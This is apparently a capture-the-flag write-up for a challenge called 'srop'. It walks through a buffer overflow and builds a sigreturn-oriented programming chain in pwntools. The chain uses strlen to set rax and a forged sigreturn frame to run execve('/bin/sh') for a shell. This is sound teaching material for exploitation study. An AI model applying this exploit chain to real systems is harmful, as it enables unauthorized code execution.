# srop

## Solution

The binary suffers from an overflow
```
004012af  488d45f8           lea     rax, [rbp-0x8 {var_10}]
004012b3  ba37130000         mov     edx, 0x1337
004012b8  4889c6             mov     rsi, rax {var_10}
004012bb  bf00000000         mov     edi, 0x0
004012c0  e89bfdffff         call    read
004012c5  90                 nop     
004012c6  c9                 leave    {__saved_rbp}
004012c7  c3                 retn     {__return_addr}
```
The binary contains a syscall tool in it, which brings to mind that this could be used for injecting a sigreturn frame. But, in order to inject this frame, we need to be able to set `rax` to `15`.

Upon inspection of the gadgets in the binary, there does not appear to be an obvious one that can alter the value of `rax`. But there is a gadget in a hint function that sets the value of `rdi`
```
0040119d  5f                 pop     rdi {var_8}
0040119e  c3                 retn     {__return_addr}
```
We also notice that `strlen` is in the binary. We can use this because this function sets `rax` to the length of the string pointed at by `rdi`. We just need to point `rdi` to a string of length `15`... Luckily, there are strings contained in the binary that are longer than `15` characters, so we only need to point `rdi` at the last `15` characters of one of those.
```python
string = next(e.search(b'-'*14 + b'\n\0'))
```
We also note that `/bin/sh` is already defined in the binary, so we can also grab this value
```python
bin_sh = next(e.search(b'/bin/sh\0'))
```
Then, we can grab all of the other gadgets we need
```python
syscalli = r.find_gadget(['syscall'])[0]
pop_rdi_ret = r.find_gadget(['pop rdi', 'ret'])[0]
strlen = e.sym['strlen']
```
Now, we can use this information to begin our chain. We first want to pop a pointer to our string into `rdi`. After that, we want to call `strlen`. Finally, we need to make the syscall.
```python
chain = cyclic(16)
chain += p64(pop_rdi_ret)
chain += p64(string)
chain += p64(strlen)
chain += p64(syscalli)
```
Now, all we need to do is create the sigreturn frame for the exploit and add it onto the chain. For this frame, we want to set `rax` to be the syscall number of `execve`. Then, we want to point `rdi` to `/bin/sh`, and set `rsi` and `rdx` to zero (which thus sets up the call). Then, we just set the instruction pointer to the syscall instruction.
```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscalli

chain += bytes(frame)
```
Thus, when we send this chain at the binary, we obtain the shell!